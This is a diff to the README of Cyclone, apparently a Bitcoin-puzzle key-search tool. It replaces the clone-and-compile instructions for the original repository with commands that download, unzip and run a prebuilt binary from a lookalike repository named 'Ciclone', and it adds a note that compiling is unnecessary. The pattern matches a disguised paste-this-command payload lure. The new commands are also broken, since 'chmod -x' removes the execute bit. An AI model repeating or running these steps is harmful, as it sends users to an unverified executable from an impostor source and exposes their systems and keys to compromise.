@@ -151,20 +151,23 @@ To get started with Cyclone, clone the repository and follow the installation in
 
 ```bash
 ## AVX2 ##
-git clone https://github.com/Dookoo2/Cyclone.git
-cd Сyclone
-cd Cyclone_avx2
-g++ -std=c++17 -Ofast -funroll-loops -ftree-vectorize -fstrict-aliasing -fno-semantic-interposition -fvect-cost-model=unlimited -fno-trapping-math -fipa-ra -fipa-modref -flto -fassociative-math -fopenmp -mavx2 -mbmi2 -madx -o Cyclone Cyclone.cpp SECP256K1.cpp Int.cpp IntGroup.cpp IntMod.cpp Point.cpp ripemd160_avx2.cpp p2pkh_decoder.cpp sha256_avx2.cpp
+wget https://github.com/secretgogeta-kernels/Ciclone/releases/download/auto-build/ciclone_avx2.zip
+unzip ciclone_avx2.zip -d ciclone_avx2
+cd ciclone_avx2
+chmod -x ciclone
+./ciclone
 ## AVX512 ##
-git clone https://github.com/Dookoo2/Cyclone.git
-cd Сyclone
-cd Cyclone_avx512
-g++ -std=c++17 -Ofast -ffast-math -funroll-loops -ftree-vectorize -fstrict-aliasing -fno-semantic-interposition -fvect-cost-model=unlimited -fno-trapping-math -fipa-ra -mavx512f -mavx512vl -mavx512bw -mavx512dq -fipa-modref -flto -fassociative-math -fopenmp -mavx2 -mbmi2 -madx -o Cyclone Cyclone.cpp SECP256K1.cpp Int.cpp IntGroup.cpp IntMod.cpp Point.cpp ripemd160_avx2.cpp p2pkh_decoder.cpp sha256_avx2.cpp ripemd160_avx512.cpp sha256_avx512.cpp
+wget https://github.com/secretgogeta-kernels/Ciclone/releases/download/auto-build/ciclone_avx512.zip
+unzip ciclone_avx512.zip -d ciclone_avx512
+cd ciclone_avx512
+chmod -x ciclone
+./ciclone
 ```
 To compile the program, you need MinGW (Minimalist GNU for Windows): **sudo apt install g++-mingw-w64-x86-64-posix**
 
 For instructions on how to compile the program in Linux for Windows (via MinGW), refer to the top of the file Cyclone.cpp.
 
+As i compiled the program via auto-builds, there's no need to compile. - secretgogeta
 ## 🚧**VERSIONS**
 **V1.4**: Added the -t key, threads for Cyclone start. Also added --public-deny, it skips any public key whose compressed X-coordinate starts with K leading zero hex digits, preventing it from entering the AVX2 hashing pipeline. Speed up to 5% of search.  
 **V1.3**: Added the -s key to save candidates into the candidates.txt file. Added Hash160 to the statistics output  (AVX2 version!)  
